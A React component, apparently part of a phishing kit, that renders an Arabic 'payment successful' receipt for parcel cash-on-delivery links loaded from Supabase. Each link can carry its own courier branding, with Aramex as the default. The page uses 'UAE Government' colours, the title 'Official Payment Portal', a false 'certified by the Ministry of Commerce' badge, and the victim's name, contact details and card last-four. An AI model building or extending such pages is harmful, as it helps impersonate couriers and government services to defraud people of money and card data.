import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash, Shield, Lock as LockIcon } from "lucide-react";

const PaymentReceiptPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = `${amount} ر.س`;

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126",
    secondary: "#00732F",
    accent: "#000000",
    background: "#FFFFFF",
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  const handleDownload = () => {
    // Create a simple receipt content
    const receiptContent = `
إيصال دفع - ${serviceName}
=====================================
رقم المعاملة: ${id}
التاريخ: ${new Date().toLocaleString('ar-SA')}
المبلغ: ${formattedAmount}
اسم العميل: ${customerInfo.name || 'غير محدد'}
الهاتف: ${customerInfo.phone || 'غير محدد'}
البريد الإلكتروني: ${customerInfo.email || 'غير محدد'}
    `.trim();
    
    const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `receipt-${id}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };
  
  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
      {/* Header */}
      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                <CheckCircle className="w-6 h-6" style={{ color: uaeColors.primary }} />
              </div>
              <div className="text-white">
                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
              </div>
            </div>
            <Badge variant="secondary" className="bg-white text-gray-800">
              <LockIcon className="w-3 h-3 ml-1" />
              اتصال آمن
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Success Icon */}
          <div className="text-center mb-6">
            <div
              className="w-24 h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg"
              style={{
                background: `linear-gradient(135deg, ${uaeColors.secondary}, ${uaeColors.primary})`
              }}
            >
              <CheckCircle className="w-12 h-12 text-white" />
            </div>
            <h1 className="text-3xl font-bold mb-2" style={{ color: uaeColors.secondary }}>
              تم الدفع بنجاح!
            </h1>
            <p className="text-sm text-gray-600">
              شكراً لك على استخدام خدمة {serviceName}
            </p>
          </div>

          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
            {/* Receipt Header */}
            <div className="p-6 border-b" style={{ backgroundColor: uaeColors.lightGray }}>
              <div className="text-center">
                <h2 className="text-xl font-bold mb-2" style={{ color: uaeColors.accent }}>
                  إيصال الدفع
                </h2>
                <p className="text-sm text-gray-600">رقم المعاملة: {id}</p>
              </div>
            </div>

            {/* Receipt Details */}
            <div className="p-6 space-y-4">
              {/* Transaction ID */}
              <div className="flex items-center justify-between py-3 border-b">
                <div className="flex items-center gap-2">
                  <Hash className="w-5 h-5 text-gray-500" />
                  <span className="text-sm font-medium">رقم المعاملة</span>
                </div>
                <span className="font-mono text-sm" style={{ color: uaeColors.accent }}>{id}</span>
              </div>

              {/* Date */}
              <div className="flex items-center justify-between py-3 border-b">
                <div className="flex items-center gap-2">
                  <Calendar className="w-5 h-5 text-gray-500" />
                  <span className="text-sm font-medium">التاريخ والوقت</span>
                </div>
                <span className="text-sm">{new Date().toLocaleString('ar-SA')}</span>
              </div>

              {/* Service */}
              <div className="flex items-center justify-between py-3 border-b">
                <span className="text-sm font-medium">الخدمة</span>
                <span className="text-sm font-semibold" style={{ color: uaeColors.accent }}>{serviceName}</span>
              </div>

              {/* Amount */}
              <div className="flex items-center justify-between py-4 border-t-2" style={{ borderColor: uaeColors.primary }}>
                <span className="text-lg font-bold" style={{ color: uaeColors.accent }}>المبلغ المدفوع</span>
                <span className="text-3xl font-bold" style={{ color: uaeColors.primary }}>
                  {formattedAmount}
                </span>
              </div>
            </div>

            {/* Customer Info */}
            <div className="p-6 border-t" style={{ backgroundColor: uaeColors.lightGray }}>
              <h3 className="font-semibold mb-4 text-base" style={{ color: uaeColors.accent }}>تفاصيل العميل</h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">الاسم:</span>
                  <span className="font-medium">{customerInfo.name || 'غير محدد'}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-medium">{customerInfo.phone || 'غير محدد'}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">البريد الإلكتروني:</span>
                  <span className="font-medium">{customerInfo.email || 'غير محدد'}</span>
                </div>
                {customerInfo.address && (
                  <div className="flex justify-between">
                    <span className="text-gray-600">العنوان:</span>
                    <span className="text-right max-w-[200px] font-medium">{customerInfo.address}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Payment Method */}
            <div className="p-6">
              <h3 className="font-semibold mb-4 text-base" style={{ color: uaeColors.accent }}>طريقة الدفع</h3>
              <div className="flex items-center gap-3 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
                <CreditCard className="w-6 h-6" style={{ color: uaeColors.primary }} />
                <div>
                  <p className="font-medium">بطاقة ائتمان</p>
                  <p className="text-sm text-gray-600">
                    **** **** **** {sessionStorage.getItem('cardLast4') || '****'}
                  </p>
                </div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="p-6 bg-gray-50 border-t space-y-3">
              <Button
                onClick={handleDownload}
                variant="outline"
                className="w-full h-12"
                style={{
                  borderColor: uaeColors.primary,
                  color: uaeColors.primary
                }}
              >
                <Download className="w-5 h-5 ml-2" />
                تحميل الإيصال
              </Button>

              <Button
                onClick={() => navigate('/')}
                size="lg"
                className="w-full h-14 text-lg font-bold text-white transition-all hover:opacity-90"
                style={{
                  backgroundColor: uaeColors.primary
                }}
              >
                <span className="ml-2">العودة للرئيسية</span>
                <ArrowLeft className="w-5 h-5" />
              </Button>
            </div>
          </div>

          {/* Security Footer */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
                معتمد من وزارة التجارة
              </span>
            </div>
          </div>

          <p className="text-xs text-center text-gray-500 mt-6">
            سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
          </p>
        </div>
      </div>
    </div>
  );
};

export default PaymentReceiptPage;